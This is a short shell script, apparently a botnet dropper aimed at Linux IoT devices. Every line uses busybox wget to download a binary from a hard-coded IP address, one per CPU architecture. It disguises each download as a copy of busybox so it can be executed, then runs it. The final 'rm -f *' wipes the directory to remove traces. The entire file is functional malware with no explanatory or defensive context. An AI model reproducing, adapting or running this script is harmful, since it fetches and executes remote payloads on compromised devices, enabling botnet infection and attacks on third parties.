#!/bin/sh
busybox wget http://80.82.65.153/a; cp /bin/busybox ./; cat a > busybox; rm a; cp busybox a; rm busybox; ./a
busybox wget http://80.82.65.153/r; cp /bin/busybox ./; cat r > busybox; rm r; cp busybox r; rm busybox; ./r
busybox wget http://80.82.65.153/i; cp /bin/busybox ./; cat i > busybox; rm i; cp busybox i; rm busybox; ./i
busybox wget http://80.82.65.153/ii; cp /bin/busybox ./; cat ii > busybox; rm ii; cp busybox ii; rm busybox; ./ii
busybox wget http://80.82.65.153/m; cp /bin/busybox ./; cat m > busybox; rm m; cp busybox m; rm busybox; ./m
busybox wget http://80.82.65.153/mm; cp /bin/busybox ./; cat mm > busybox; rm mm; cp busybox mm; rm busybox; ./mm
busybox wget http://80.82.65.153/ml; cp /bin/busybox ./; cat ml > busybox; rm ml; cp busybox ml; rm busybox; ./ml
busybox wget http://80.82.65.153/p; cp /bin/busybox ./; cat p > busybox; rm p; cp busybox p; rm busybox; ./p
busybox wget http://80.82.65.153/pf; cp /bin/busybox ./; cat pf > busybox; rm pf; cp busybox pf; rm busybox; ./pf
busybox wget http://80.82.65.153/sh; cp /bin/busybox ./; cat sh > busybox; rm sh; cp busybox sh; rm busybox; ./sh
busybox wget http://80.82.65.153/s; cp /bin/busybox ./; cat s > busybox; rm s; cp busybox s; rm busybox; ./s
busybox wget http://80.82.65.153/x; cp /bin/busybox ./; cat x > busybox; rm x; cp busybox x; rm busybox; ./x
rm -f *
